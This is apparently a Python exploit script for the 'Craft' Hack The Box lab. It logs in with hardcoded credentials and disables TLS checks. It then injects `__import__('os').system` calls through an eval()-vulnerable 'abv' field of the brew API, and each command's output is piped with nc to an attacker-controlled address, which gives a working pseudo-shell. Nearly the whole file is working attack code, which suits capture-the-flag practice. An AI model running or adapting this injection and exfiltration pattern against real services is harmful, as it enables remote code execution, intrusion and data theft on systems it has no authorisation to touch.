from requests import Session
import subprocess
import json
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

"""
Script that exploits a RCE vulnerability from a python `eval()` call
to create a simple shell
"""

sesssion = Session()
sesssion.auth = ("dinesh", "4aUh0A8PbVJxgd")

url_base = "https://api.craft.htb/api/"


# Receves the auth tokens
r = sesssion.get(url_base + "auth/login", verify=False)
token_req = json.loads(r.text)

while True:

    command = input("> ")

    s = subprocess.Popen("nc -lvnp 6868", shell=True)

    data={
            "name":"X",
            "brewer":"X", 
            "style": "X", 
            "abv": f"__import__('os').system('{command} | nc 10.10.14.5 6868')"
        }

    r = sesssion.post(url_base + "brew/", 
        headers={
            "X-Craft-API-Token": token_req['token'],
            "Content-Type": "application/json"
        },
        data=json.dumps(data),
        proxies={
            # "https": "http://127.0.0.1:8080"
        },
        verify=False
        )